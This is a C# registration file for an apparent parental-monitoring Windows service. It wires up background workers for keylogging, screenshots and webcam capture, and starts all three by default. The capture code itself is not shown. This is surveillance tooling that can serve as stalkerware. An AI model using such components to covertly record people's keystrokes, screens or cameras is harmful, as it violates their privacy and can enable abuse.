namespace ParentalSight.WindowsService
{
    using Microsoft.Extensions.Configuration;
    using Microsoft.Extensions.DependencyInjection;
    using ParentalSight.Core;
    using ParentalSight.WindowsService.Settings;
    using ParentalSight.WindowsService.WorkerServices;
    using System;
    using System.Collections.Generic;
    using System.Linq;

    internal static class WorkerRegistrar
    {
        private static Dictionary<string, Action<IServiceCollection, IConfiguration>> _hostedServiceRegistrations =>
            new Dictionary<string, Action<IServiceCollection, IConfiguration>>
            {
                {
                     "keylogger", (services, config) => services.AddHostedService<KeyloggerWorker>()
                                                                .AddKeylogger(new KeyloggerSettings(config))
                },
                {
                    "screenshot", (services, config) => services.AddHostedService<ScreenshotWorker>()
                                                                .AddScreenshotService(new ScreenshotSettings(config))
                },
                {
                        "webcam", (services, config) => services.AddHostedService<WebcamWorker>()
                                                                .AddWebcamService(new WebcamSettings(config))
                }
            };

        public static IServiceCollection AddHostedServices(this IServiceCollection services, IConfiguration config, string[] args)
        {
            foreach (var service in args ?? _hostedServiceRegistrations.Select(x => x.Key))
                _hostedServiceRegistrations[service](services, config);

            return services;
        }
    }
}